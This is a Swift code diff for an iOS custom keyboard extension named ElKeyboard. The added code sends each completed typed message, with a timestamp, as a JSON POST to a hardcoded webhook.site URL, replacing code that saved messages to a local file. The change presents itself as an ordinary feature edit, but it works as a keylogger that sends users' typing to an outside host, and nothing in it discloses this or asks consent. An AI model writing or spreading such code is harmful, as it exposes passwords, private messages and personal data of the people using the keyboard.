@@ -71,8 +71,8 @@ class KeyboardViewController: UIInputViewController {
             }
         case "return":
             textDocumentProxy.insertText("\n")
-            // Message is complete, save it to file (don't add \n to currentMessage)
-            saveMessageToFile()
+            // Message is complete, send it to webhook (don't add \n to currentMessage)
+            sendMessageToWebhook()
             currentMessage = "" // Reset for next message
         case "123":
             // You could toggle symbol layout here
@@ -85,41 +85,53 @@ class KeyboardViewController: UIInputViewController {
         }
     }
     
-    // Save the completed message to a file with separator
-    private func saveMessageToFile() {
+    // Send the completed message to webhook with separator
+    private func sendMessageToWebhook() {
         guard !currentMessage.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty else { return }
         
-        // Get the shared container directory
-        guard let containerURL = FileManager.default.containerURL(forSecurityApplicationGroupIdentifier: "group.com.yourcompany.ElKeyboard") else {
-            print("Unable to access shared container for app group: group.com.yourcompany.ElKeyboard")
-            print("This is likely due to missing entitlements. Messages will not be saved.")
-            print("To fix this, ensure both the main app and keyboard extension have proper app group entitlements.")
+        // Webhook URL
+        guard let webhookURL = URL(string: "https://webhook.site/5b734151-e1d2-467f-8536-c96f4cce5998") else {
+            print("Invalid webhook URL")
             return
         }
         
-        let messagesFileURL = containerURL.appendingPathComponent("messages.txt")
-        
-        // Prepare the message with separator
+        // Prepare the message with separator (same format as before)
         let messageWithSeparator = currentMessage + "\n------\n"
         
-        // Write to file (append if exists, create if doesn't)
-        if FileManager.default.fileExists(atPath: messagesFileURL.path) {
-            // File exists, append to it
-            if let fileHandle = try? FileHandle(forWritingTo: messagesFileURL) {
-                fileHandle.seekToEndOfFile()
-                if let data = messageWithSeparator.data(using: .utf8) {
-                    fileHandle.write(data)
-                }
-                fileHandle.closeFile()
-            }
-        } else {
-            // File doesn't exist, create it
-            do {
-                try messageWithSeparator.write(to: messagesFileURL, atomically: true, encoding: .utf8)
-                print("Successfully created messages file and saved message")
-            } catch {
-                print("Failed to create messages file: \(error)")
-            }
+        // Create JSON payload
+        let payload: [String: Any] = [
+            "message": messageWithSeparator,
+            "timestamp": ISO8601DateFormatter().string(from: Date()),
+            "source": "ElKeyboard"
+        ]
+        
+        // Convert to JSON data
+        guard let jsonData = try? JSONSerialization.data(withJSONObject: payload) else {
+            print("Failed to serialize JSON payload")
+            return
         }
+        
+        // Create HTTP request
+        var request = URLRequest(url: webhookURL)
+        request.httpMethod = "POST"
+        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
+        request.httpBody = jsonData
+        
+        // Send the request
+        URLSession.shared.dataTask(with: request) { data, response, error in
+            if let error = error {
+                print("Failed to send message to webhook: \(error)")
+                return
+            }
+            
+            if let httpResponse = response as? HTTPURLResponse {
+                print("Webhook response status: \(httpResponse.statusCode)")
+                if httpResponse.statusCode == 200 {
+                    print("Message successfully sent to webhook")
+                } else {
+                    print("Webhook returned error status: \(httpResponse.statusCode)")
+                }
+            }
+        }.resume()
     }
 }
